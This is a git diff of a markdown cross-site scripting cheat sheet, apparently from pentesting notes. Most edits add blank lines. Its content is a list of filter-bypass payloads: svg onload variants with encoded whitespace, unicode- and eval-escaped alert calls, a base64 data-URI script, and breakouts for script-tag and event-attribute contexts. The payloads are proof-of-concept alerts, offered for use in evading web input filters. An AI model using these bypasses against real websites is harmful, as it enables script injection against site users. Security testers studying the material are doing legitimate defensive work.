@@ -103,16 +103,25 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 ### Regex blacklist filtering
 
 (on\w+\s*=)
+
 <svc/onload=alert(1)>
+
 <svg//////onload=alert(1)>
+
 <svg id=x;onload=alert(1)>
-<svg id=`x`onload=alert(1)>
+  
+<svg id=\`x\`onload=alert(1)>
   
 (?i)([\s\"'`;\/0-9\=]+on\w+\s*=)
+  
 <svg onload%09=alert(1)>
+  
 <svg %09onload=alert(1)>
+  
 <svg %09onload%20=alert(1)>
+  
 <svg onload%09%20%28%2C%3B=alert(1)>
+  
 <svg onload%0B=alert(1)>
 
 ### Keyword based in filter
@@ -120,8 +129,11 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 #### blocked - alert - bypass
   
 <script>\u0061lert(1)</script>
+  
 <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+  
 <script>eval("\u0061lert(1)")</script>
+  
 <script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script> 
   
 #### Removing HTML Tags
@@ -131,7 +143,9 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 ### Scaping Quote
   
 ### Methods
+  
 -> String.fromCharCode()
+  
 -> unescape
 
 Ex:
@@ -153,7 +167,9 @@ Add execution sink for execution:
 #### HTML Tag
   
 <div>
+  
 here
+  
 </div>
 
 -> <svg/onload=alert(1)
@@ -164,10 +180,12 @@ here
  
 -> adaa"> <a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show</!--
   
-#### <script> Tag
+#### Script Tag
   
 <script>
+  
 var name="here";
+  
 </div>
   
 -> ;alert(1);//
@@ -175,7 +193,9 @@ var name="here";
 #### Event Attributes
 
 <button onclick="reserve(here);">
+  
 Okay!
+  
 </button>
 
 -> alert(1)
